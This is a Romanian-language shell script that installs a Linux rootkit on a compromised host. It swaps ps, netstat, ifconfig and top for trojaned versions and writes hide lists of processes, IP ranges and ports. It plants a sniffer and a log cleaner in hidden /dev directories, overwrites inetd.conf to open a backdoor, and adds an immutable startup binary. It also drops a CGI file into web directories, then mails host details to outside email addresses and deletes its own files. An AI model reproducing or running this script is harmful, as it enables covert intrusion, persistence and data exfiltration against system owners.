#!/bin/sh
clear
unset HISTFILE
echo    "********* Instalarea Rootkitului A Pornit La Drum *********"
echo    "********* Mircea SUGI PULA ********************************"
echo    "********* Multumiri La Toti Care M-Au Ajutat **************" 
echo    "********* Lemme Give You A Tip : **************************"
echo    "********* Ignore everything, call your freedom ************"
echo    "********* Scream & swear as much as you can ***************"
echo    "********* Cuz anyway nobody will hear you and no one will *"
echo    "********* Care about you **********************************"
echo
echo
chown root.root *
if [ -f /usr/bin/make ]; then
    echo "Are Make !"
else
    echo "Nu Are Make !"
fi
if [ -f /usr/bin/gcc ]; then
    echo "Are Gcc !"
else
    echo "Nu Are Gcc !"
fi
if [ -f /usr/sbin/sshd/ ]; then
    echo "Are Ssh !"
else 
    echo "Nu Are Ssh !"
fi
echo -n "* Inlocuim nestat ... alea alea "
rm -rf /sbin/ifconfig
mv ifconfig /sbin/ifconfig
rm -rf /bin/netstat
mv netstat /bin/netstat
rm -rf /bin/ps
mv ps /bin/ps
rm -rf /usr/bin/top
mv top /usr/bin/top
cp -f mkxfs /usr/sbin/
echo "* Gata..."
echo -n "* Dev... "
echo
echo
touch /dev/rpm
>/dev/rpm
echo "3 sl2" >>/dev/rpm
echo "3 sshdu" >>/dev/rpm
echo "3 linsniffer" >>/dev/rpm
echo "3 smurf" >>/dev/rpm
echo "3 slice" >>/dev/rpm
echo "3 mech" >>/dev/rpm
echo "3 muh" >>/dev/rpm
echo "3 bnc" >>/dev/rpm
echo "3 psybnc" >> /dev/rpm
touch /dev/last
>/dev/last
echo "1 193.231.139" >>/dev/last
echo "1 213.154.137" >>/dev/last
echo "1 193.254.34" >>/dev/last
echo "3 48744" >>/dev/last
echo "3 3666" >>/dev/last
echo "3 31221" >>/dev/last
echo "3 22546" >>/dev/last
echo "4 48744" >>/dev/last
echo "4 2222" >>/dev/last
echo "* Gata"

echo "* Facem Director...Si Mutam Alea.. "
mkdir -p /dev/ida/.drag-on
mkdir -p /dev/ida/".. "
echo "* Copiem ssh si alea"
cp linsniffer logclear sense sl2 mkxfs s ssh_host_key ssh_random_seed /dev/ida/.drag-on/
cp linsniffer logclear sense sl2 mkxfs s ssh_host_key ssh_random_seed /dev/ida/".. "
rm -rf linsniffer logclear sense sl2 mkxfs s ssh_host_key ssh_random_seed
touch /dev/ida/.drag-on/tcp.log
touch /dev/ida/".. "/tcp.log

cp -f inetd.conf /etc
cp -f services /etc
killall -HUP inetd
echo 
echo
echo
echo "* Adaugam In Startup:) ..."
rm -rf /usr/bin/lsattr
echo "/usr/bin/lsattr -t1 -X53 -p" >> /etc/rc.d/rc.sysinit
echo >> /etc/rc.d/rc.sysinit
cp -f lsattr /usr/bin/
chmod 500 /usr/bin/lsattr
chattr +i /usr/bin/lsattr
/usr/bin/lsattr

sleep 1

if [ -d /home/httpd/cgi-bin ]
then
mv -f last.cgi /home/httpd/cgi-bin/
fi

if [ -d /usr/local/httpd/cgi-bin ]
then
mv -f last.cgi /usr/local/httpd/cgi-bin/
fi

if [ -d /usr/local/apache/cgi-bin ]
then
mv -f last.cgi /usr/local/apache/cgi-bin/
fi

if [ -d /www/httpd/cgi-bin ]
then
mv -f last.cgi /www/httpd/cgi-bin/
fi

if [ -d /www/cgi-bin ]
then
mv -f last.cgi /www/cgi-bin/
fi

echo "* Luam Informatiile dorite ..."
echo "* Info : $(uname -a)" >> computer
echo "* Hostname : $(hostname -f)" >> computer
echo "* IfConfig : $(/sbin/ifconfig | grep inet)" >> computer
echo "* Uptime : $(uptime)" >> computer
echo "* Cpu Vendor ID : $(cat /proc/cpuinfo|grep vendor_id)" >> computer
echo "* Cpu Model : $(cat /proc/cpuinfo|grep model)" >> computer
echo "* Cpu Speed: $(cat /proc/cpuinfo|grep MHz)" >> computer
echo "* Bogomips: $(cat /proc/cpuinfo|grep bogomips)" >> computer
echo "* Spatiu Liber: $(df -h)" >> computer
echo "* Gata ! Trimitem Mailul ...Asteapta Te Rog "
cat computer | mail -s "placinte" last@linuxmail.org
cat computer | mail -s "roote" bidi_damm@yahoo.com
echo "* Am trimis mailul ... stergem fisierele care nu mai trebuie ."
echo
echo
echo "* G A T A *"
echo
echo "* That Was Nice Last "
cd /
rm -rf last lk.tgz computer lk.tar.gz

# [binary junk removed from end of file]
